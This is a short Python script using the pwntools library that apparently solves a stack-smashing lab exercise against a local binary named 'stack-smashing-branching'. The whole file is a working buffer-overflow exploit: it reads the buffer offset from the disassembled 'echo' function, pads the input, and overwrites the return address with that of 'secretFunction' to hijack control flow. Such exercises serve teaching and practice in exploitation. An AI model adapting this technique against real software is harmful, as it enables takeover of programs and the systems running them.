from pwn import *
import sys
from subprocess import run

context.log_level = 'critical'
e=ELF("/shared/stack-smashing-branching")

address = p32(e.symbols[b'secretFunction'])
x = disasm(e.read(e.symbols[b'echo'], 64))
hexdata = x[x.find("ebp-")+4:x.find("ebp-")+8]


pad = (b'a'*(int(hexdata, 16)+4))

p=process('./stack-smashing-branching', stderr=2)
p.recv()
p.sendline(pad+address)
print(p.recv())